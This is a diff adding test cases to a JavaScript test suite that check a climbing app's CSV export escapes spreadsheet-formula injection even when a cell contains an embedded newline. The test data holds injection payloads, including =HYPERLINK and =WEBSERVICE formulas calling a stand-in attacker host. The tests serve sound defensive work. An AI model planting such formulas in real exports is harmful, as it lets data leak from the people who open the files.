@@ -197,6 +197,19 @@ describe("buildSendsExportCsv formula escaping", () => {
     );
   });
 
+  // papaparse's own `escapeFormulae: true` pattern ends in `.*$`, and `.`
+  // does not match LF — so one newline in the cell made the whole pattern
+  // miss and shipped the payload unescaped. Climb and area names keep
+  // interior newlines, so this was a live bypass, not a curiosity.
+  it.each([
+    ["=1\n+2", "climbName"],
+    ['=HYPERLINK("https://evil.tld","x")\n', "areaName"],
+    ["=WEBSERVICE(\"https://evil.tld\")\r\n=1+1", "climbName"],
+  ])("escapes %j in %s despite an embedded newline", (payload, field) => {
+    // Not cellsOf: the payload's own newline would split the row.
+    expect(buildSendsExportCsv([row({ [field]: payload })])).toContain(neutralized(payload));
+  });
+
   it("leaves an ordinary name untouched", () => {
     expect(cellsOf(buildSendsExportCsv([row({ climbName: "Midnight Lightning" })]))).toContain(
       "Midnight Lightning",
